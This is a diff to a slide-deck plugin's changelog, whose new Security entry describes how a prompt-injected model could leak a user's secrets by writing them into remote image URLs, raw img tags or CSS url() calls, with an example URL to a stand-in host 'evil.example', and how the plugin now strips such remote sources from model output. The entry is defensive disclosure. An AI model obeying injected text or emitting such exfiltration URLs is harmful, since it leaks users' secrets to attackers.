@@ -6,6 +6,10 @@ versioning follows [SemVer](https://semver.org/).
 
 ## [Unreleased]
 
+### Security
+
+- **A generated deck can no longer load remote resources.** Because secrets in your note are now replaced by placeholders on the way to the model and put back into the answer, a prompt-injected model could write a placeholder into an image URL (`![x](https://evil.example/?d=…)`), a raw `<img src=…>` or a CSS `url(…)` and have the secret fetched as soon as the deck is previewed or the note is opened. The plugin now defuses remote sources in the model's answer before the note is written: remote Markdown images, raw `<img>`/`<iframe>`/… with a remote `src`, `url(http…)` in `style`, and the code-block processors `dataview`, `dataviewjs` and `js-engine`. Fences (code, Mermaid, image slots), layout directives, `![[…]]` embeds, `data:` images and relative paths stay. Limits, stated plainly: this is a **text-layer** defence, not a guarantee; clickable links stay (a click is a deliberate act); a remote image you wrote into a note yourself is not touched, only the model's answer. A DOM-based layer is planned.
+
 ### Changed
 
 - **The whole LLM connection now comes from the Kit** (`createLlmConnection`, obsidian-kit 0.51.2 / code-kit 0.15.0): endpoint source, endpoint list, request parameters, the chat client with its deadlines, and the response check. The plugin's own resolver, client factory, backend-probe cache and deviation texts are gone. Visible consequences:
